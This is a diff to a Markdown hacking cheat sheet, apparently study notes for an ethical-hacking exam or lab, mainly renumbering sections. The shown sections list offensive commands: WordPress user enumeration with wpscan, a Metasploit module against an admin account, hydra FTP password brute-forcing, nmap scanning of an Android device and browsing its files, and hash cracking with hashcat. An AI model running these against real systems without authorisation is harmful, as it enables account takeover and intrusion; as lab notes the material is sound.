@@ -16,9 +16,9 @@
 ### 5. Wordlist location find
  ```
  $ locate wordlists
-  $ locae rockyou.txt
-
-### 5. WP scan (Wp Vulnerability)
+ $ locae rockyou.txt
+```
+### 6. WP scan (Wp Vulnerability)
   $ wpscan --url IP --enumerate u
 ```  
  => msfconsole 
@@ -30,13 +30,13 @@ set TARGETURI http://IP:port
 set USERNAME admin
 ->run
 ```
-### 6. FTP Passowrd find
+### 7. FTP Passowrd find
   $ hydra -l user -P passlist.txt ftp://IP
 
-### 7. Prints the route that a packet takes to reach the host
+### 8. Prints the route that a packet takes to reach the host
   $ traceroute google.com
 
-### 8. Android
+### 9. Android
 ```
   $ netdiscover -r IP/24   (got final IP)
   $ nmap -O IP
@@ -52,7 +52,7 @@ set USERNAME admin
   IP address again of android device
   pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
 ```
-### 9. Stegography
+### 10. Stegography
   ```
   $ Snow.exe -C -p “given_password” file_name.txt  (Pass tu hobo = 'test')
   -C  compressing / uncompressing
@@ -61,7 +61,7 @@ set USERNAME admin
   Open Stego (GUI tool):
      Open the exe > open and select file > click get
  ```
-### 10. Cryptography
+### 11. Cryptography
 ```
 #### Identify:
 https://hashes.com/en/tools/hash_identifier
@@ -82,7 +82,7 @@ https://crackstation.net
    0  = MD5
    100 = SHA1
    1400 = SHA256
-   
+  ``` 
 ## 10. Used Tools
 ```
 Veracrypt
